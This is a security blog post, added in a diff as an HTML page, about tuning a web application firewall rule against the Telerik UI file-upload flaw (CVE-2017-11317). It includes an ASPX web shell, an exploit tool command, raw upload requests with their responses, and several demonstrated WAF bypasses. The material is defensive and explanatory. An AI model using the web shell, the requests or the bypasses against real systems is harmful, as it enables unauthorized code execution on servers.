@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>WAF Journey - Fixing Telerik UI Remote Code Execution via Arbitrary File Upload</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+	==========================<br>
+	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
+	==========================
+	<div style="float: right;">A Techi Personal Blog</div><br>
+	<p>
+	<nav>
+			<a href="/"><b>Start</b></a>.
+			
+			
+			<a href="/posts/"><b>Posts</b></a>.
+			
+			<a href="/categories/"><b>Categories</b></a>.
+			
+			<a href="/tags/"><b>Tags</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>WAF Journey - Fixing Telerik UI Remote Code Execution via Arbitrary File Upload</h1>
+			<b><time>22.01.2025 00:00</time></b>
+		       
+		           <a href="/tags/supply-chain-security">supply-chain-security</a>
+        	       
+		           <a href="/tags/telerik-ui">telerik-ui</a>
+        	       
+		           <a href="/tags/waf">waf</a>
+        	       
+		           <a href="/tags/wapt">wapt</a>
+        	       
+		           <a href="/tags/web-application-firewall">web-application-firewall</a>
+        	       
+
+			<div>
+				<h3 id="introduction">Introduction</h3>
+<p>It might occur that companies discover vulnerabilities on web application assets that were acquired by <em>third party vendors</em>.</p>
+<p>What happens if the asset is no longer supported/licensed and cannot be promptly <em>updated</em> by the organization?</p>
+<p>A viable option is by using a <em>Web Application Firewall</em> (WAF) component using a <em><strong>custom developed rule</strong></em> to block attempts to exploit specific vulnerabilities.</p>
+<p>Even though this behavior might <em>not</em> be the definitive solution, it allows a company to buy time to figure out how to correctly patch or, perhaps, replace the vulnerable asset.</p>
+<p>This blog post goes through a real life scenario that describes the development process of the <em>WAF</em> rule created to mitigate the <em>Telerik Unrestricted File Upload</em> (CVE-2017-11317) vulnerability which further led to <em>remote code execution</em> (CVE-2019-18935).</p>
+<p>In particular, after providing some <em>background</em> of the vulnerability and some <strong><em>undocumented</em></strong> <em><strong>details</strong></em> about exploitation, a technical drill down will be performed to describe all the steps of a challenging tuning process to find the right <em>Web Application Firewall</em> rule and, hopefully, block the vulnerability from being exploited.</p>
+<p>From a defensive point of view it is important to underline that <em>WAFs</em> are powerful tools to secure assets but the development process of rules to fix vulnerabilities should not be overlooked, since <em>poorly engineered rules</em> are often bypassed by attackers.</p>
+<h3 id="telerik-unrestricted-file-upload-literature">Telerik Unrestricted File Upload Literature</h3>
+<p>Telerik RadAsyncUpload feature was initially found to be vulnerable to path traversal attacks (CVE-2014-2217) allowing users to upload files to arbitrary paths.</p>
+<p>The vulnerability was then fixed by encrypting the <em>rauPostData</em> parameter containing the information regarding the location of the file upload.</p>
+<p>However, up until version v2017.2.621, Telerik RadAsyncUpload was configured to use a <strong>hard-coded key</strong> (CVE-2017-11317) to encrypt data in file upload requests. Therefore, an attacker could perform requests to the &ldquo;<em>/Telerik.Web.Ui.WebResource.axd?type=rau</em>&rdquo; endpoint with a custom encrypted <em>rauPostData</em> parameter to upload arbitrary files within any directory of the web server.</p>
+<p>Later on, researchers also found out that the <em>rauPostData</em> was subject to <strong>insecure deserialization</strong> within the .NET code of Telerik since it contained the class type that was used to deserialize the object.</p>
+<p>This vulnerability led to remote code execution (CVE-2019-18935) and is now publicly available as a tool.</p>
+<h3 id="real-life-scenario">Real Life Scenario</h3>
+<p>The present article will focus on how the arbitrary file upload vulnerability (CVE-2017-11317) was addressed within a real life scenario.</p>
+<p>During a network penetration test for a client, the presence of Telerik UI was detected on a web application since it performed requests to the &ldquo;<em>/Telerik.Web.UI.WebResource.axd&rdquo;</em> endpoint to download JavaScript files for its UI.</p>
+<p>By analyzing some response of the application it was possible to find the string &ldquo;<em>2014.2.724.40</em>&rdquo; in a HTML comment, indicating the presence of Telerik UI version 2014.2.724 vulnerable to the mentioned CVEs.</p>
+<p>Also, thanks to a full path disclosure vulnerability of the application it was possible to identify the path of a folder within the web root of the application.</p>
+<p>It was enough to upload a malicious &ldquo;.aspx&rdquo; file within the web root of the application and achieve an unauthenticated remote code execution:</p>
+<pre tabindex="0"><code>&lt;%@ Page Language=&#34;VB&#34; Debug=&#34;true&#34; %&gt;&lt;%@ import Namespace=&#34;system.IO&#34; %&gt;&lt;%@ import Namespace=&#34;System.Diagnostics&#34; %&gt;​&lt;html xmlns=&#34;www.w3.org/1999/xhtml&#34;&gt;&lt;head runat=&#34;server&#34;&gt;    &lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form id=&#34;form1&#34; runat=&#34;server&#34;&gt;    &lt;div&gt;    &lt;%     Dim myProcess As New Process()                Dim myProcessStartInfo As New ProcessStartInfo(&#34;c:windowssystem32cmd.exe&#34;)    myProcessStartInfo.UseShellExecute = false    myProcessStartInfo.RedirectStandardOutput = true    myProcess.StartInfo = myProcessStartInfo    myProcessStartInfo.Arguments=&#34;/c dir&#34;    myProcess.Start()    Dim myStreamReader As StreamReader = myProcess.StandardOutput    Dim myString As String = myStreamReader.Readtoend()    myProcess.Close()    mystring=replace(mystring,&#34;&lt;&#34;,&#34;&amp;lt;&#34;)    mystring=replace(mystring,&#34;&gt;&#34;,&#34;&amp;gt;&#34;)    Response.Write(vbcrlf &amp; &#34;&lt;pre&gt;&#34; &amp; mystring &amp; &#34;&lt;/pre&gt;&#34;)    %&gt;    &lt;/div&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;
+</code></pre><p>File Upload Exploitation</p>
+<p>In order to upload the aspx file, the RAU_crypto tool was used to automatically create a valid file upload request encrypted with the hard-coded key of Telerik.</p>
+<p>The tool was invoked using the following command line string:</p>
+<pre tabindex="0"><code>python RAU_crypto.py -P c:\destination\folder 2014.2.724 malicious.aspx http://victim.com/Telerik.Web.UI.WebResource.axd?type=rau BurpProxyHost:8080
+</code></pre><p>The command line parameters contain the following information:</p>
+<ol>
+<li>
+<p>The P parameter contains the path of the destination folder where the file needs to be uploaded. In our case it contained the path of the web root we discovered at an earlier stage.</p>
+</li>
+<li>
+<p>The version of Telerik UI so that the tool can use the correct key to encrypt the <em>rauPostData</em></p>
+</li>
+<li>
+<p>The file to upload. In our case, the malicious .aspx file shown above.</p>
+</li>
+<li>
+<p>The target URL of the Telerik RadAsyncUpload endpoint.</p>
+</li>
+<li>
+<p>The address of a proxy to inspect the requests performed by the tool</p>
+</li>
+</ol>
+<p>By launching the tool, the following request was performed:</p>
+<pre tabindex="0"><code>POST /ApplicationPath/Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1Host: victim.comAccept-Encoding: gzip, deflateContent-Length: 3221Content-Type: multipart/form-data; boundary=---------------------------62616f37756f2fConnection: close​-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;rauPostData&#34;​ATTu5i4R+V[Encrypted rauPostData Payload in base64]FAlzLUg==-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;file&#34;; filename=&#34;blob&#34;Content-Type: application/octet-stream​&lt;%@ Page Language=&#34;VB&#34; Debug=&#34;true&#34; %&gt;&lt;%@ import Namespace=&#34;system.IO&#34; %&gt;&lt;%@ import Namespace=&#34;System.Diagnostics&#34; %&gt;​&lt;html xmlns=&#34;www.w3.org/1999/xhtml&#34;&gt;&lt;head runat=&#34;server&#34;&gt;    &lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form id=&#34;form1&#34; runat=&#34;server&#34;&gt;    &lt;div&gt;    &lt;%     Dim myProcess As New Process()                Dim myProcessStartInfo As New ProcessStartInfo(&#34;c:windowssystem32cmd.exe&#34;)    myProcessStartInfo.UseShellExecute = false    myProcessStartInfo.RedirectStandardOutput = true    myProcess.StartInfo = myProcessStartInfo    myProcessStartInfo.Arguments=&#34;/c dir&#34;    myProcess.Start()    Dim myStreamReader As StreamReader = myProcess.StandardOutput    Dim myString As String = myStreamReader.Readtoend()    myProcess.Close()    mystring=replace(mystring,&#34;&lt;&#34;,&#34;&amp;lt;&#34;)    mystring=replace(mystring,&#34;&gt;&#34;,&#34;&amp;gt;&#34;)    Response.Write(vbcrlf &amp; &#34;&lt;pre&gt;&#34; &amp; mystring &amp; &#34;&lt;/pre&gt;&#34;)    %&gt;    &lt;/div&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;fileName&#34;​RAU_crypto.bypass-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;contentType&#34;​text/html-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;lastModifiedDate&#34;​2019-01-02T03:04:05.067Z-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;metadata&#34;​{&#34;TotalChunks&#34;:1,&#34;ChunkIndex&#34;:0,&#34;TotalFileSize&#34;:1,&#34;UploadID&#34;:&#34;test_109742195623.aspx&#34;}-----------------------------62616f37756f2f--
+</code></pre><p>It is possible to notice that the application performs a request to the <em>&quot;/Telerik.Web.UI.WebResource.axd?type=rau&quot;</em> endpoint attaching the malicious file and the <em>rauPostData</em> parameter containing all the encrypted metadata required for Telerik to handle the uploaded file.</p>
+<p>Since the <em>rauPostData</em> parameter was encrypted with the hardcoded key of the 2014.2.724 Telerik version it accepts the unauthenticated upload as shown in the response to the previous request.</p>
+<p>Response:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OKCache-Control: privateContent-Type: text/html; charset=utf-8Date: Wed, 01 Apr 2020 10:48:50 GMTConnection: closeContent-Length: 667​{&#34;fileInfo&#34;:{&#34;FileName&#34;:&#34;RAU_crypto.bypass&#34;,&#34;ContentType&#34;:&#34;text/html&#34;,&#34;ContentLength&#34;:884,&#34;DateJson&#34;:&#34;2019-01-02T03:04:05.067Z&#34;,&#34;Index&#34;:0}, &#34;metaData&#34;:&#34;[Base64 Metadata]&#34; }
+</code></pre><p>Since the malicious &ldquo;.aspx&rdquo; was uploaded to a known folder in the web root of the application, it was then sufficient to recall the file with a URL of the application to execute the code. The following screenshot shows how the code prints the content of the &ldquo;<em>C:WindowsSysWOW64inetsrv</em>&rdquo; directory belonging to the IIS Web Server that is hosting the vulnerable application.</p>
+<p>
+<figure>
+  <img src="https://1.bp.blogspot.com/-8Q9p92TETp4/X6b3p76xc5I/AAAAAAAAAAU/FpIAUo_wJsQJ97r5RoAmKn7EH3a3PXiWQCLcBGAsYHQ/w493-h270/better.png" alt="" />
+</figure>
+
+
+</p>
+<h4></h4>
+<p>Fixing the Issue at WAF level</p>
+<p>Once the criticality of the vulnerability was confirmed, the client was immediately contacted in order to speed up the fixing of the file upload.</p>
+<p>The <strong>ideal fix</strong> for the vulnerability would be that of <strong>updating the version</strong> of <em>Telerik UI</em> used by the application to its latest version that is no longer vulnerable.</p>
+<p>However, <strong>the client informed us</strong>, shortly after the disclosure, that it had <strong>no immediate control over the vulnerable asset since it was a third party product that could not be updated right away.</strong></p>
+<p>The application could not be <em>simply dismantled</em> because it was still actively used within the organization.</p>
+<p><em>&ldquo;So, what now?&rdquo;</em></p>
+<p>The only viable option for the client was that of <strong>creating a WAF rule</strong> that would block any request exploiting the vulnerable file upload functionality offered by Telerik.</p>
+<p>The following paragraphs will recap the various attempts that were performed address the vulnerability, in collaboration with client WAF engineers, without impacting on the usability of the asset.</p>
+<p><strong>- 1st WAF Rule - Overkill</strong></p>
+<p>The first rule attempt consisted in <em>blocking all incoming requests</em> towards &ldquo;<em>/Telerik.Web.UI.WebResource.axd</em>&rdquo; endpoint belonging to Telerik UI.</p>
+<p>Unfortunately, the rule was <strong>too strict.</strong> It not only blocked every malicious calls, but also any form of interaction of the application with Telerik UI making the user interface <em>unusable</em>.</p>
+<p><strong>-</strong> <strong>2nd WAF Rule: Hunting for &ldquo;<em>rau</em>&rdquo;</strong></p>
+<p>Final goal: blocking all the requests to Telerik UI using <em>RadAsyncUpload</em> functionality.</p>
+<p>The rule was relaxed by adding a condition. The request must contain the &ldquo;<em>type=rau</em>&rdquo; parameter value within the query string since it was the command for file upload.</p>
+<p>This rule was enough to block basic requests, as the one reported above, created by automatic tools that exploit the vulnerability such as RAU_crypto .</p>
+<p>However, it was noticed that the Web Application Firewall <strong>would not normalize</strong> the value of the received parameters.</p>
+<p>A valid bypass would be to URL encode a character within the &ldquo;<em>type</em>&rdquo; parameter value &ldquo;<em>rau</em>&rdquo; to bypass the rule, specifically:</p>
+<p>&ldquo;<em>rau</em>&rdquo; -&gt; &ldquo;<em>ra%75</em>&rdquo; where &ldquo;<em>%75</em>&rdquo; is the &ldquo;<em>u</em>&rdquo; character URL encoded.</p>
+<p>The following request shows how it was possible to still load an arbitrary file on the system.</p>
+<p>Request:</p>
+<pre tabindex="0"><code>POST /Telerik.Web.UI.WebResource.axd?type=ra%75 HTTP/1.1Host: victim.comUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_st64; rv:75.0) Gecko/20100101 Firefox/75.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Type: multipart/form-data; boundary=---------------------------62616f37756f2fConnection: closeContent-Length: 2347​-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;rauPostData&#34;​ATTu5i4R+ViNFY[Encrypted rauPostData Payload in base64]mUFAlzLUg==-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;file&#34;; filename=&#34;blob&#34;Content-Type: application/octet-stream​Test_Test-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;fileName&#34;​RAU_crypto.bypass-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;contentType&#34;​text/html-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;lastModifiedDate&#34;​2019-01-02T03:04:05.067Z-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;metadata&#34;​{&#34;TotalChunks&#34;:1,&#34;ChunkIndex&#34;:0,&#34;TotalFileSize&#34;:1,&#34;UploadID&#34;:&#34;test_12421498329494.txt&#34;}-----------------------------62616f37756f2f--​
+</code></pre><p>Response:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OKCache-Control: privateContent-Type: text/html; charset=utf-8Date: Thu, 07 May 2020 16:11:22 GMTContent-Length: 667Connection: close​{&#34;fileInfo&#34;:{&#34;FileName&#34;:&#34;RAU_crypto.bypass&#34;,&#34;ContentType&#34;:&#34;text/html&#34;,&#34;ContentLength&#34;:135,&#34;DateJson&#34;:&#34;2019-01-02T03:04:05.067Z&#34;,&#34;Index&#34;:0}, &#34;metaData&#34;:&#34;[Base64 Metadata]&#34; }
+</code></pre><p>It was observed that the custom rules developed for the specific WAF did <strong>not perform normalization by default</strong> on the path and query string parameters and therefore are unable to detect URL encoded characters.</p>
+<p>To address this bypass, the client was assisted in finding the WAF functionality that allowed to normalize the query string parameter of the request and detect any URL encoded parameters in the &ldquo;<em>type=rau</em>&rdquo; parameter.</p>
+<p><em>&ldquo;So, all is good now, right?&rdquo;</em></p>
+<p><em>Not quite&hellip;</em></p>
+<p><strong>-</strong> <strong>3rd WAF Rule: the &ldquo;case&rdquo; is still open</strong></p>
+<p>A regression test was then performed in order to be sure that the vulnerability was patched. However, although the URL encoding did not lead to a bypass anymore, it was found that the endpoint was <strong>case insentive!</strong></p>
+<p>In fact, by specifying the value &ldquo;<em>raU</em>&rdquo; within the &ldquo;<em>type</em>&rdquo; parameter it was still valid as shown in the following request:</p>
+<pre tabindex="0"><code>POST /Telerik.Web.UI.WebResource.axd?type=raU HTTP/1.1Host: victim.comUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_st64; rv:75.0) Gecko/20100101 Firefox/75.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Type: multipart/form-data; boundary=---------------------------62616f37756f2fConnection: closeContent-Length: 2345​-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;rauPostData&#34;​ATTu5i4R+ViNFY[Encrypted rauPostData Payload in base64]mUFAlzLUg==-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;file&#34;; filename=&#34;blob&#34;Content-Type: application/octet-stream​Test_Test-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;fileName&#34;​RAU_crypto.bypass-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;contentType&#34;​text/html-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;lastModifiedDate&#34;​2019-01-02T03:04:05.067Z-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;metadata&#34;​{&#34;TotalChunks&#34;:1,&#34;ChunkIndex&#34;:0,&#34;TotalFileSize&#34;:1,&#34;UploadID&#34;:&#34;test_12421498329494.txt&#34;}-----------------------------62616f37756f2f--​
+</code></pre><p>Response:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OKCache-Control: privateContent-Type: text/html; charset=utf-8Date: Fri, 08 May 2020 10:25:09 GMTContent-Length: 667Connection: close​{&#34;fileInfo&#34;:{&#34;FileName&#34;:&#34;RAU_crypto.bypass&#34;,&#34;ContentType&#34;:&#34;text/html&#34;,&#34;ContentLength&#34;:153,&#34;DateJson&#34;:&#34;2019-01-02T03:04:05.067Z&#34;,&#34;Index&#34;:0}, &#34;metaData&#34;:&#34;[Base64 Metadata]&#34; }
+</code></pre><p>To address this new bypass it was necessary to tune the rule <em>so that it transformed to lower case all the characters within the query string parameters before applying the check on the presence of the &ldquo;type=rau&rdquo; parameter</em>.</p>
+<p>So now we&rsquo;re confident that any variation of the &ldquo;<em>Telerik.Web.UI.WebResource.axd?type=rau</em>&rdquo; within the path of the <em>HTTP</em> request would be blocked by the the WAF rule.</p>
+<p><em>&ldquo;Is it enough now?&rdquo;</em></p>
+<p><strong>-</strong> <strong>4th WAF Rule: the Multipart Magic</strong></p>
+<p>The Telerik UI file upload functionality can only be performed using an HTTP POST request of the &ldquo;<em>multipart/form-data</em>&rdquo; content type.</p>
+<p>The WAF rule did not allow any variations of the &ldquo;<em>type=rau</em>&rdquo; parameter within the URL query string of the request.</p>
+<p><em>But what if the parameter is inserted within the body of the &ldquo;multipart/form-data&rdquo; file upload request?</em></p>
+<p>Request:</p>
+<pre tabindex="0"><code>POST /Telerik.Web.UI.WebResource.axd HTTP/1.1Host: victim.comUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_st64; rv:75.0) Gecko/20100101 Firefox/75.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Type: multipart/form-data; boundary=---------------------------62616f37756f2fConnection: closeContent-Length: 2444​-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;rauPostData&#34;​ATTu5i4R+ViN[Encrypted rauPostData Payload in base64]AmUFAlzLUg==-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;file&#34;; filename=&#34;blob&#34;Content-Type: application/octet-stream​Test_Test-----------------------------62616f37756f2fContent-Disposition: form-da[Encrypted rauPostData Payload in base64]ta; name=&#34;fileName&#34;​RAU_crypto.bypass-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;type&#34;​rau-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;contentType&#34;​text/html-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;lastModifiedDate&#34;​2019-01-02T03:04:05.067Z-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;metadata&#34;​{&#34;TotalChunks&#34;:1,&#34;ChunkIndex&#34;:0,&#34;TotalFileSize&#34;:1,&#34;UploadID&#34;:&#34;test_12421498329494.txt&#34;}-----------------------------62616f37756f2f--
+</code></pre><p>Response:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OKCache-Control: privateContent-Type: text/html; charset=utf-8Date: Thu, 07 May 2020 14:29:31 GMTContent-Length: 666Connection: close​{&#34;fileInfo&#34;:{&#34;FileName&#34;:&#34;RAU_crypto.bypass&#34;,&#34;ContentType&#34;:&#34;text/html&#34;,&#34;ContentLength&#34;:18,&#34;DateJson&#34;:&#34;2019-01-02T03:04:05.067Z&#34;,&#34;Index&#34;:0},&#34;metaData&#34;:&#34;[Base64 Metadata]&#34; }​
+</code></pre><p><em>It works!</em></p>
+<p>Telerik UI accepts the &ldquo;<em>type</em>&rdquo; parameter also as a body parameter of the &ldquo;<em>multipart/form-data</em>&rdquo; file upload voiding the efficacy of the <em>WAF</em> rule that performs its checks on the URL query string parameters of the request.</p>
+<p>The discovery of this behavior required the security engineers of the client to change the approach of the rule development: in order to block this vulnerability it was not enough to check the contents of the query string but it was necessary to perform checks on the body of the POST request as well.</p>
+<p><strong>- 5th WAF Rule: RegEx Woes</strong></p>
+<p>In order to be sure to block also the requests that do not contain any parameter within the query string, regular expressions were used to check the content of the request body.</p>
+<p>In particular, the focus was placed on blocking all the requests with the &ldquo;<em>rauPostData</em>&rdquo; parameter, containing file upload encrypted metadata, within the URL query string or the request body.</p>
+<p>The check within the body of the request was performed using the following regular expression, after normalizing and transforming to lower case its content:</p>
+<pre tabindex="0"><code>.*name=.?.?raupostdata.*
+</code></pre><p>This rule blocked a request if performed using the regular syntax to insert a &ldquo;<em>multipart/form-data</em>&rdquo; parameter.</p>
+<p>The image below shows how a regular parameter matches the regular expression.</p>
+<p>
+<figure>
+  <img src="https://1.bp.blogspot.com/-gSJXB-0XvRs/X6fbDtA_XRI/AAAAAAAAAAg/KNihf91Jx6gJK0S0ABLFQZLfVmlm0doqgCLcBGAsYHQ/w577-h179/regexmatch.png" alt="" />
+</figure>
+
+
+</p>
+<p>However, the regular expression check can be bypassed. The weakness of this check relies on the central portion of the expression that checks for a maximum of two characters <em>(&quot;.?.?&quot;)</em> between &ldquo;<em>name=&rdquo;</em> and &ldquo;<em>raupostdata</em>&rdquo;. If three spaces are added between the strings and the quotes are removed the expression will no longer match as shown below.</p>
+<p>
+<figure>
+  <img src="https://1.bp.blogspot.com/-vb5LVz2YYwQ/X6fbN02N_AI/AAAAAAAAAAk/VyQsmqa-l_0arf4ohI5LQviVraQ4Z1lowCLcBGAsYHQ/w573-h161/regexfail.png" alt="" />
+</figure>
+
+
+</p>
+<p>With this modification the parameter was still considered valid by the web server allowing once again the file upload.</p>
+<p>Request:</p>
+<pre tabindex="0"><code>POST /Weblink/Telerik.Web.UI.WebResource.axd HTTP/1.1Host: victim.comUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_st64; rv:75.0) Gecko/20100101 Firefox/75.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Type: multipart/form-data; boundary=---------------------------62616f37756f2fConnection: closeContent-Length: 2473​-----------------------------62616f37756f2fContent-Disposition: form-data; name=   rauPostData​ATTu5i4R+ViNFYO[Encrypted rauPostData Payload in base64]9TB0pfAmUFAlzLUg==-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;file&#34;; filename=&#34;blob&#34;Content-Type: application/octet-stream​Test_Test-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;fileName&#34;​RAU_crypto.bypass-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;type&#34;​rau-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;contentType&#34;​text/html-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;lastModifiedDate&#34;​2019-01-02T03:04:05.067Z-----------------------------62616f37756f2fContent-Disposition: form-data; name=&#34;metadata&#34;​{&#34;TotalChunks&#34;:1,&#34;ChunkIndex&#34;:0,&#34;TotalFileSize&#34;:1,&#34;UploadID&#34;:&#34;test_12421498329494.txt&#34;}-----------------------------62616f37756f2f--​​
+</code></pre><p>Response:</p>
+<pre tabindex="0"><code>HTTP/1.1 200 OKCache-Control: privateContent-Type: text/html; charset=utf-8Date: Tue, 19 May 2020 14:26:16 GMTContent-Length: 666Connection: close​{&#34;fileInfo&#34;:{&#34;FileName&#34;:&#34;RAU_crypto.bypass&#34;,&#34;ContentType&#34;:&#34;text/html&#34;,&#34;ContentLength&#34;:18,&#34;DateJson&#34;:&#34;2019-01-02T03:04:05.067Z&#34;,&#34;Index&#34;:0},&#34;metaData&#34;:&#34;[Base64 Metadata]&#34; }
+</code></pre><p>Finally, the regular expression was changed to prevent also this last bypass:</p>
+<pre tabindex="0"><code>.*name=.*raupostdata.*
+</code></pre><p>With this rule, no matter how many characters are inserted between the strings, the request will still be blocked.</p>
+<h4 id="conclusions">Conclusions</h4>
+<p>This article has shown the process used to tune the web application firewall rule while studying the exploit of the Telerik Unrestricted File Upload (CVE-2017-11317) vulnerability.</p>
+<p>It demonstrates how a vulnerability, that appears trivial to fix, requires an accurate analysis to develop a valid WAF rule.</p>
+<p>The several failed rule attempts underline the importance of the following factors when developing a WAF rule:</p>
+<ul>
+<li>
+<p>Avoid the implementation of coarse rules that impair the usability of an asset</p>
+</li>
+<li>
+<p>Always perform normalization and lower case transformation of the textual parameters to check</p>
+</li>
+<li>
+<p>Be suspicious of very strict regular expressions</p>
+</li>
+</ul>
+<p>Obviously, all the recommendations above can be reversed for a penetration tester.</p>
+<p><strong>Bottom line?</strong> Always look for a bypass!</p>
+<h4 id="references">References</h4>
+<ul>
+<li>
+<p><a href="https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html">https://codewhitesec.blogspot.com/2019/02/telerik-revisited.html</a></p>
+</li>
+<li>
+<p><a href="https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui">https://labs.bishopfox.com/tech-blog/cve-2019-18935-remote-code-execution-in-telerik-ui</a></p>
+</li>
+<li>
+<p><a href="https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/unrestricted-file-upload">https://www.telerik.com/support/kb/aspnet-ajax/upload-(async)/details/unrestricted-file-upload</a></p>
+</li>
+<li>
+<p><a href="https://github.com/noperator/CVE-2019-18935">https://github.com/noperator/CVE-2019-18935</a></p>
+</li>
+<li>
+<p><a href="https://github.com/bao7uo/RAU">https://github.com/bao7uo/RAU</a>_crypto</p>
+</li>
+</ul>
+<p>Go to Source</p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/posts/2025-03-20-srsly-risky-biz-chinas-mss-gets-persona/">Srsly Risky Biz Chinas MSS gets personal</a></li>
+				
+				<li><a href="/posts/2025-03-19-risky-bulletin-google-buys-wiz-for-32-b/">Risky Bulletin Google buys Wiz for 32 billion</a></li>
+				
+				<li><a href="/posts/apple-inc-sent-you-a-payment-request-payoneer-invoices-other-microsoft-enabled-scams/">“Apple Inc sent you a payment request” Payoneer invoices; other Microsoft-enabled scams</a></li>
+				
+				<li><a href="/posts/glasses-that-transcribe-text-to-audio/">“Glasses” That Transcribe Text To Audio</a></li>
+				
+				<li><a href="/posts/5-best-linux-centos-replacement-options-alternatives/">&lt;div&gt;5 Best Linux CentOS Replacement Options &amp; Alternatives&lt;/div&gt;</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
+	<a href="https://github.com/Gharib110"><b>Github</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
